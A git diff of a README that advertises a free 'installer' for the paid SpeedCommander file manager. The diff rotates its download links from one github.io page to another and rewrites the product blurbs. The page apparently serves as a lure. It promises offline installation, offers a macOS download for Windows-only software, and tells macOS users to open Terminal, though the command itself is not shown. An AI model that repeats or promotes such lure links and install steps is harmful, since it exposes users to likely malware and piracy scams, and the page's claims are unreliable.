@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-File+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 SpeedCommander Free Installer** — SpeedCommander is a feature-rich dual-pane file manager for Windows combining traditional commander-style navigation with modern features. Works without internet access, no account required. Full offline installation.
+**💻 SpeedCommander Free Installer** — SpeedCommander is a Windows dual-pane file manager with FTP/SFTP support, archive management, file preview, tabbed browsing, and extensive keyboard shortcut customization. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install SpeedCommander](https://img.shields.io/badge/⬇_Install_SpeedCommander-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SpeedCommander](https://img.shields.io/badge/⬇_Install_SpeedCommander-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About SpeedCommander
 
-SpeedCommander is a feature-rich dual-pane file manager for Windows combining traditional commander-style navigation with modern features. Supports built-in archive management for ZIP, RAR, 7-Zip, and many formats, FTP and SFTP connections, file synchronization, and a batch rename tool. SpeedCommander is a comprehensive replacement for Windows Explorer aimed at power users.
+SpeedCommander is a Windows dual-pane file manager with FTP/SFTP support, archive management, file preview, tabbed browsing, and extensive keyboard shortcut customization. A modern alternative to Total Commander with a cleaner interface.
 
 ---
 
 ## ❌ Problem: SpeedCommander is hard to access
 
-- **Windows Only** — No macOS or Linux version
-- **Commercial License** — Paid software after trial period
-- **Learning Curve** — Dual-pane workflow requires adjustment for Windows Explorer users
-- **Interface Density** — Feature-rich interface may feel cluttered to casual users
+- **Windows Only** — No macOS or Linux version available
+- **Paid License** — Requires purchase
+- **Niche Market** — Power file manager users often loyal to Total Commander
+- **Learning Investment** — Dual-pane workflow requires adjustment for Windows Explorer users
 
 ---
 
@@ -61,9 +61,9 @@ SpeedCommander is a feature-rich dual-pane file manager for Windows combining tr
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ SpeedCommander is a feature-rich dual-pane file manager for Windows combining tr
 
 <div align="center">
 
-[![⬇ Install SpeedCommander](https://img.shields.io/badge/⬇_Install_SpeedCommander-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SpeedCommander](https://img.shields.io/badge/⬇_Install_SpeedCommander-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ SpeedCommander is a feature-rich dual-pane file manager for Windows combining tr
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ SpeedCommander is a feature-rich dual-pane file manager for Windows combining tr
 
 ---
 
-**SpeedCommander Free Installer** — SpeedCommander is a feature-rich dual-pane file manager for Windows combining traditional commander-style navigation with modern features. Install without internet connection today!
+**SpeedCommander Free Installer** — SpeedCommander is a Windows dual-pane file manager with FTP/SFTP support, archive management, file preview, tabbed browsing, and extensive keyboard shortcut customization. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install SpeedCommander](https://img.shields.io/badge/⬇_Install_SpeedCommander-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SpeedCommander](https://img.shields.io/badge/⬇_Install_SpeedCommander-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
